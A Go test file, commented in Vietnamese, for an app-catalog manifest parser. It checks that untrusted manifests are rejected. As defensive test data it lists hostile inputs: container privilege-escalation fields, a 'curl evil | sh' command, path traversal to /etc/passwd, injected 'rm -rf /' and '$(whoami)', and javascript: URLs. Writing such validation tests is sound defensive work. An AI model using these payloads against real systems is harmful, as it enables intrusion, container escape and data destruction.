package catalog_test

// Test UI-01 — danh mục app.
//
// Trọng tâm là CHÍNH SÁCH, không phải cú pháp: manifest đến từ nguồn ngoài,
// nên mỗi test dưới đây tương ứng một cách mà một catalog độc hại (hoặc chỉ là
// cẩu thả) có thể làm hại instance.

import (
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"strings"
	"testing"

	"github.com/keenrig/keenrig/keenrig-node/internal/catalog"
)

const goodJSON = `{
  "id": "nginx",
  "title": "Nginx",
  "version": "1.27.4",
  "repository": "docker.io/library/nginx",
  "tag": "1.27.4-alpine",
  "digest": "sha256:4ff102c5d78d254a6f0da062b3cf39eaf07f01eec0927fd21e219d0af8bc0591",
  "http_port": 80,
  "min_memory_mb": 64
}`

func parse(t *testing.T, js string) (*catalog.Manifest, error) {
	t.Helper()
	return catalog.Parse(strings.NewReader(js))
}

func mustParse(t *testing.T, js string) *catalog.Manifest {
	t.Helper()
	m, err := parse(t, js)
	if err != nil {
		t.Fatalf("manifest hợp lệ bị từ chối: %v", err)
	}
	return m
}

func TestParseGoodManifest(t *testing.T) {
	m := mustParse(t, goodJSON)
	if m.ID != "nginx" || m.HTTPPort != 80 || m.MinMemoryMB != 64 {
		t.Errorf("manifest = %+v", m)
	}
	// Hai tham chiếu, hai mục đích: một để CHẠY, một để ĐỌC.
	if got, want := m.ImageRef(), "docker.io/library/nginx@sha256:4ff102c5d78d254a6f0da062b3cf39eaf07f01eec0927fd21e219d0af8bc0591"; got != want {
		t.Errorf("ImageRef = %q, muốn %q", got, want)
	}
	if got, want := m.DisplayRef(), "docker.io/library/nginx:1.27.4-alpine"; got != want {
		t.Errorf("DisplayRef = %q, muốn %q", got, want)
	}
	// Tag KHÔNG được lọt vào ref dùng để chạy: `repo:tag@digest` hợp lệ với
	// Docker nhưng tag ở đó chỉ là trang trí, và giữ nó tạo ảo giác rằng đổi
	// tag sẽ đổi thứ đang chạy.
	if strings.Contains(m.ImageRef(), m.Tag) {
		t.Errorf("ImageRef mang cả tag: %q", m.ImageRef())
	}
}

// Trường LẠ phải là LỖI. Đây là toàn bộ chiến lược phòng thủ của package: định
// dạng hẹp, và bất cứ thứ gì ngoài định dạng đều bị chặn ở cửa.
func TestUnknownFieldRejected(t *testing.T) {
	hostile := []string{
		`"privileged": true`,
		`"volumes": ["/:/host"]`,
		`"cap_add": ["SYS_ADMIN"]`,
		`"network_mode": "host"`,
		`"pid": "host"`,
		`"devices": ["/dev/sda"]`,
		`"security_opt": ["seccomp:unconfined"]`,
		`"command": "sh -c 'curl evil | sh'"`,
		`"entrypoint": "/bin/sh"`,
		`"user": "root"`,
	}
	for _, extra := range hostile {
		t.Run(extra, func(t *testing.T) {
			js := strings.TrimSuffix(strings.TrimSpace(goodJSON), "}") + ",\n  " + extra + "\n}"
			_, err := parse(t, js)
			if !errors.Is(err, catalog.ErrInvalidManifest) {
				t.Fatalf("trường %s được chấp nhận (err = %v).\n"+
					"Định dạng hẹp là lớp phòng thủ DUY NHẤT ở đây — bỏ qua trường lạ "+
					"nghĩa là một catalog độc hại thêm gì cũng được và không ai thấy.", extra, err)
			}
		})
	}
}

// Digest BẮT BUỘC và phải đúng dạng. Không có nó thì "cài lại app này" tháng
// sau cho ra một image khác mà không ai biết.
func TestDigestRequired(t *testing.T) {
	bad := map[string]string{
		"thiếu hẳn":      `"digest": ""`,
		"chỉ có tag":     `"digest": "1.27.4-alpine"`,
		"thiếu tiền tố":  `"digest": "4ff102c5d78d254a6f0da062b3cf39eaf07f01eec0927fd21e219d0af8bc0591"`,
		"ngắn":           `"digest": "sha256:4ff102"`,
		"không phải hex": `"digest": "sha256:zzz102c5d78d254a6f0da062b3cf39eaf07f01eec0927fd21e219d0af8bc0591"`,
		"md5":            `"digest": "md5:4ff102c5d78d254a6f0da062b3cf39ea"`,
	}
	for name, frag := range bad {
		t.Run(name, func(t *testing.T) {
			js := strings.Replace(goodJSON,
				`"digest": "sha256:4ff102c5d78d254a6f0da062b3cf39eaf07f01eec0927fd21e219d0af8bc0591"`, frag, 1)
			if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
				t.Errorf("digest %s được chấp nhận: %v", name, err)
			}
		})
	}
}

// id đi vào tên container, tên thư mục dữ liệu VÀ đường dẫn URL — ba chỗ path
// traversal cùng lúc.
func TestHostileID(t *testing.T) {
	for _, id := range []string{
		"../../../etc/passwd", "a/b", "..", ".", "", "A", "app_name",
		"-leading", "trailing-", "a", strings.Repeat("x", 60),
		"app name", "app;rm -rf /", "app\x00",
	} {
		js := strings.Replace(goodJSON, `"id": "nginx"`, `"id": `+quote(id), 1)
		if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("id %q được chấp nhận: %v", id, err)
		}
	}
}

// icon đi vào một đường dẫn file trên máy chủ.
func TestHostileIcon(t *testing.T) {
	for _, icon := range []string{
		"../../../etc/passwd", "a/b.svg", `..\..\win.ini`, "../secret",
	} {
		js := strings.TrimSuffix(strings.TrimSpace(goodJSON), "}") + `,"icon": ` + quote(icon) + "}"
		if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("icon %q được chấp nhận: %v", icon, err)
		}
	}
}

// javascript:/data: trong website/source biến một liên kết trong Admin UI
// thành đường thực thi mã trong phiên của quản trị viên.
func TestHostileURL(t *testing.T) {
	for _, u := range []string{
		"javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
		"file:///etc/passwd", "vbscript:msgbox", "//evil.example",
	} {
		js := strings.TrimSuffix(strings.TrimSpace(goodJSON), "}") + `,"website": ` + quote(u) + "}"
		if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("website %q được chấp nhận: %v", u, err)
		}
	}
}

func TestHostileRepository(t *testing.T) {
	for _, repo := range []string{
		"", "evil.example/x; rm -rf /", "repo name", "REPO/UPPER",
		"repo/$(whoami)", "repo\x00", "--privileged",
	} {
		js := strings.Replace(goodJSON, `"repository": "docker.io/library/nginx"`,
			`"repository": `+quote(repo), 1)
		if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("repository %q được chấp nhận: %v", repo, err)
		}
	}
}

func TestHTTPPortRange(t *testing.T) {
	for _, port := range []string{"0", "-1", "65536", "99999"} {
		js := strings.Replace(goodJSON, `"http_port": 80`, `"http_port": `+port, 1)
		if _, err := parse(t, js); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("http_port %s được chấp nhận: %v", port, err)
		}
	}
}

func TestTrailingGarbageRejected(t *testing.T) {
	// Hai document nối nhau: hai trình đọc khác nhau có thể thấy hai nội dung
	// khác nhau từ cùng một file.
	if _, err := parse(t, goodJSON+goodJSON); !errors.Is(err, catalog.ErrInvalidManifest) {
		t.Errorf("manifest có rác ở đuôi được chấp nhận: %v", err)
	}
}

// --- ToDesired ------------------------------------------------------------------

func TestToDesiredPinsDigest(t *testing.T) {
	m := mustParse(t, goodJSON)
	d, err := m.ToDesired(catalog.InstallOptions{Domains: []string{"app.example.com"}})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(d.Image, "@sha256:") {
		t.Fatalf("desired.Image = %q — KHÔNG ghim digest. contracts.ValidateDesired "+
			"sẽ từ chối, và nếu nó không từ chối thì app sẽ trôi theo tag.", d.Image)
	}
	if d.HTTPPort != 80 {
		t.Errorf("HTTPPort = %d", d.HTTPPort)
	}
	if d.Resources == nil || d.Resources.MemoryMB != 64 {
		t.Errorf("Resources = %+v, muốn MemoryMB 64 từ min_memory_mb", d.Resources)
	}
	if len(d.Domains) != 1 || d.Domains[0] != "app.example.com" {
		t.Errorf("Domains = %v", d.Domains)
	}
}

// Người dùng luôn THẮNG manifest ở phần env. Ngược lại thì một manifest đặt
// được biến mà người dùng không gỡ nổi.
func TestUserEnvOverridesManifest(t *testing.T) {
	js := strings.TrimSuffix(strings.TrimSpace(goodJSON), "}") +
		`,"env": {"TZ": "UTC", "LANG": "C"}}`
	m := mustParse(t, js)

	d, err := m.ToDesired(catalog.InstallOptions{Env: map[string]string{"TZ": "Asia/Ho_Chi_Minh"}})
	if err != nil {
		t.Fatal(err)
	}
	if d.Env["TZ"] != "Asia/Ho_Chi_Minh" {
		t.Errorf("TZ = %q — lựa chọn của người dùng bị manifest ghi đè", d.Env["TZ"])
	}
	if d.Env["LANG"] != "C" {
		t.Errorf("LANG = %q — mặc định của manifest bị mất", d.Env["LANG"])
	}
}

// Env do NGƯỜI DÙNG truyền cũng phải qua kiểm — nó không đi qua Parse.
func TestUserEnvIsValidatedToo(t *testing.T) {
	m := mustParse(t, goodJSON)
	for name, env := range map[string]map[string]string{
		"tên có dấu bằng": {"A=B": "x"},
		"tên rỗng":        {"": "x"},
		"giá trị có NUL":  {"A": "x\x00y"},
		"giá trị quá dài": {"A": strings.Repeat("x", catalog.MaxEnvValueLen+1)},
	} {
		if _, err := m.ToDesired(catalog.InstallOptions{Env: env}); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("env %s được chấp nhận: %v", name, err)
		}
	}
}

// Cài KHÔNG kèm domain phải được: máy vừa cài chưa có tên miền nào, và bắt
// buộc domain ở đây sẽ chặn đúng người dùng cần cài nhất.
func TestInstallWithoutDomain(t *testing.T) {
	m := mustParse(t, goodJSON)
	d, err := m.ToDesired(catalog.InstallOptions{})
	if err != nil {
		t.Fatalf("cài không kèm domain bị từ chối: %v", err)
	}
	if len(d.Domains) != 0 {
		t.Errorf("Domains = %v, muốn rỗng", d.Domains)
	}
}

func TestMemoryOverride(t *testing.T) {
	m := mustParse(t, goodJSON)
	d, _ := m.ToDesired(catalog.InstallOptions{MemoryMB: 512})
	if d.Resources == nil || d.Resources.MemoryMB != 512 {
		t.Errorf("Resources = %+v, muốn 512", d.Resources)
	}
}

// --- danh mục ------------------------------------------------------------------

// Danh mục NHÚNG phải nạp được và mọi entry phải hợp lệ. Đây là test canh cho
// chính dữ liệu ta ship: một manifest hỏng lọt vào bản phát hành nghĩa là app
// đó biến mất khỏi màn hình cài của mọi người dùng.
func TestBuiltinCatalogIsValid(t *testing.T) {
	c, errs := catalog.LoadBuiltin()
	for _, err := range errs {
		t.Errorf("manifest nhúng hỏng: %v", err)
	}
	if c.Len() == 0 {
		t.Fatal("danh mục nhúng RỖNG — màn hình cài app sẽ không có gì để chọn")
	}
	for _, m := range c.List() {
		d, err := m.ToDesired(catalog.InstallOptions{})
		if err != nil {
			t.Errorf("%s: ToDesired lỗi: %v", m.ID, err)
			continue
		}
		// Mọi entry ship kèm PHẢI dựng được desired hợp lệ. Không kiểm ở đây
		// thì lỗi lộ ra lúc người dùng bấm cài, và họ sẽ nghĩ platform hỏng.
		if !strings.Contains(d.Image, "@sha256:") {
			t.Errorf("%s: image %q không ghim digest", m.ID, d.Image)
		}
	}
}

// List phải ỔN ĐỊNH: map của Go duyệt ngẫu nhiên, và một danh sách nhảy loạn
// mỗi lần tải lại trang là lỗi UI không ai truy được nguyên nhân.
func TestListIsStable(t *testing.T) {
	c, _ := catalog.LoadBuiltin()
	first := ids(c.List())
	for i := 0; i < 20; i++ {
		if got := ids(c.List()); got != first {
			t.Fatalf("lần %d: %q != %q", i, got, first)
		}
	}
}

func ids(ms []*catalog.Manifest) string {
	out := make([]string, 0, len(ms))
	for _, m := range ms {
		out = append(out, m.ID)
	}
	return strings.Join(out, ",")
}

// Một manifest hỏng KHÔNG được làm rỗng cả danh mục — nhưng cũng KHÔNG được
// im lặng.
func TestBadManifestDoesNotKillCatalog(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir+"/good.json", strings.Replace(goodJSON, `"id": "nginx"`, `"id": "good"`, 1))
	writeFile(t, dir+"/hong.json", `{ đây không phải json`)

	c, errs := catalog.LoadFS(dirFS(dir))
	if c.Len() != 1 {
		t.Errorf("danh mục có %d app, muốn 1 (file hỏng bị bỏ, file tốt vẫn nạp)", c.Len())
	}
	if len(errs) != 1 {
		t.Errorf("báo %d lỗi, muốn 1 — bỏ qua im lặng là cách một app biến mất "+
			"khỏi danh mục mà không ai biết vì sao", len(errs))
	}
}

// Tên file phải khớp id: lệch nhau thì `grep -r "<id>"` không tìm ra file, và
// đó là thao tác đầu tiên của bất kỳ ai đi sửa một entry.
func TestFilenameMustMatchID(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir+"/ten-khac.json", goodJSON) // id bên trong là "nginx"

	c, errs := catalog.LoadFS(dirFS(dir))
	if c.Len() != 0 {
		t.Errorf("nạp %d app dù tên file lệch id", c.Len())
	}
	if len(errs) != 1 {
		t.Errorf("errs = %v", errs)
	}
}

// Danh mục ngoài GHI ĐÈ bản nhúng: người vận hành phải sửa được một entry họ
// không tin, mà không phải dựng lại binary.
func TestExternalCatalogOverridesBuiltin(t *testing.T) {
	builtin, _ := catalog.LoadBuiltin()
	base, err := builtin.Get("nginx")
	if err != nil {
		t.Skip("danh mục nhúng không có nginx — test này không còn nghĩa")
	}

	dir := t.TempDir()
	writeFile(t, dir+"/nginx.json", strings.Replace(goodJSON,
		`"title": "Nginx"`, `"title": "Nginx (bản của tôi)"`, 1))

	c, errs := catalog.Load(dir)
	for _, e := range errs {
		t.Errorf("lỗi không mong đợi: %v", e)
	}
	got, err := c.Get("nginx")
	if err != nil {
		t.Fatal(err)
	}
	if got.Title == base.Title {
		t.Errorf("title = %q — bản ngoài KHÔNG ghi đè được bản nhúng", got.Title)
	}
}

// Thư mục ngoài không tồn tại là chuyện BÌNH THƯỜNG, không phải lỗi.
func TestMissingExternalDirIsNotAnError(t *testing.T) {
	c, errs := catalog.Load(t.TempDir() + "/khong-ton-tai")
	if len(errs) != 0 {
		t.Errorf("thư mục không tồn tại bị coi là lỗi: %v", errs)
	}
	if c.Len() == 0 {
		t.Error("mất luôn danh mục nhúng")
	}
}

// --- helper ---------------------------------------------------------------------

func quote(s string) string {
	b, err := json.Marshal(s)
	if err != nil {
		panic(err)
	}
	return string(b)
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func dirFS(dir string) fs.FS { return os.DirFS(dir) }

// --- volumes + origin_env -----------------------------------------------------

func withFields(extra string) string {
	return strings.TrimSuffix(strings.TrimSpace(goodJSON), "}") + "," + extra + "}"
}

// Volume phải đi tới desired — thiếu nó thì app có database nhúng (Activepieces)
// mất sạch dữ liệu ở lần cập nhật đầu tiên.
func TestVolumesReachDesired(t *testing.T) {
	m := mustParse(t, withFields(`"volumes":[{"name":"data","path":"/root/.app"}]`))
	d, err := m.ToDesired(catalog.InstallOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(d.Volumes) != 1 || d.Volumes[0].Name != "data" || d.Volumes[0].Path != "/root/.app" {
		t.Fatalf("Volumes = %+v", d.Volumes)
	}
	// Không dùng chung slice với manifest: sửa desired không được sửa danh mục.
	d.Volumes[0].Name = "x"
	if m.Volumes[0].Name != "data" {
		t.Error("desired.Volumes dùng chung mảng với manifest")
	}
}

// Name thành đoạn đường dẫn THẬT trên máy chủ — `..` ở đây là mount thư mục
// chứa master.key vào container.
func TestHostileVolume(t *testing.T) {
	for name, vol := range map[string]string{
		"path traversal": `{"name":"../../instance","path":"/data"}`,
		"có gạch chéo":   `{"name":"a/b","path":"/data"}`,
		"path tương đối": `{"name":"data","path":"data"}`,
		"đè /proc":       `{"name":"data","path":"/proc"}`,
	} {
		if _, err := parse(t, withFields(`"volumes":[`+vol+`]`)); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("volume %s được chấp nhận: %v", name, err)
		}
	}
	if _, err := parse(t, withFields(`"volumes":[{"name":"data","path":"/a"},{"name":"data","path":"/b"}]`)); !errors.Is(err, catalog.ErrInvalidManifest) {
		t.Errorf("hai volume trùng tên được chấp nhận: %v", err)
	}
}

func TestOriginEnv(t *testing.T) {
	m := mustParse(t, withFields(`"origin_env":"AP_FRONTEND_URL"`))

	d, err := m.ToDesired(catalog.InstallOptions{Domains: []string{"flows.example.com", "b.example.com"}})
	if err != nil {
		t.Fatal(err)
	}
	if got := d.Env["AP_FRONTEND_URL"]; got != "https://flows.example.com" {
		t.Errorf("AP_FRONTEND_URL = %q, muốn URL của domain ĐẦU TIÊN", got)
	}

	// Không domain → không bịa URL.
	d, _ = m.ToDesired(catalog.InstallOptions{})
	if v, ok := d.Env["AP_FRONTEND_URL"]; ok {
		t.Errorf("không có domain mà AP_FRONTEND_URL = %q", v)
	}

	// Người dùng vẫn thắng — họ có thể đứng sau proxy khác.
	d, _ = m.ToDesired(catalog.InstallOptions{
		Domains: []string{"flows.example.com"},
		Env:     map[string]string{"AP_FRONTEND_URL": "http://10.0.0.5:8080"},
	})
	if got := d.Env["AP_FRONTEND_URL"]; got != "http://10.0.0.5:8080" {
		t.Errorf("AP_FRONTEND_URL = %q — ghi đè của người dùng bị mất", got)
	}

	if _, err := parse(t, withFields(`"origin_env":"A=B"`)); !errors.Is(err, catalog.ErrInvalidManifest) {
		t.Errorf("origin_env sai tên được chấp nhận: %v", err)
	}
}

// Bí mật viết cứng trong manifest là CÙNG MỘT bí mật cho mọi bản cài: ai đọc
// danh mục công khai là ký được JWT cho mọi Activepieces cài từ nó.
func TestSecretEnvIsRandomPerInstall(t *testing.T) {
	m := mustParse(t, withFields(`"secret_env":["AP_JWT_SECRET"]`))

	a, err := m.ToDesired(catalog.InstallOptions{})
	if err != nil {
		t.Fatal(err)
	}
	b, _ := m.ToDesired(catalog.InstallOptions{})
	sa, sb := a.Env["AP_JWT_SECRET"], b.Env["AP_JWT_SECRET"]
	if len(sa) != 64 {
		t.Fatalf("AP_JWT_SECRET = %q, muốn 64 ký tự hex", sa)
	}
	if sa == sb {
		t.Error("hai lần cài nhận CÙNG một bí mật")
	}

	// Người dùng thắng — khôi phục bản cài cũ cần đúng khoá cũ.
	c, _ := m.ToDesired(catalog.InstallOptions{Env: map[string]string{"AP_JWT_SECRET": "old"}})
	if c.Env["AP_JWT_SECRET"] != "old" {
		t.Errorf("AP_JWT_SECRET = %q — giá trị người dùng bị ghi đè", c.Env["AP_JWT_SECRET"])
	}

	for name, js := range map[string]string{
		"tên sai":       `"secret_env":["A B"]`,
		"trùng với env": `"env":{"K":"fixed"},"secret_env":["K"]`,
	} {
		if _, err := parse(t, withFields(js)); !errors.Is(err, catalog.ErrInvalidManifest) {
			t.Errorf("secret_env %s được chấp nhận: %v", name, err)
		}
	}
}
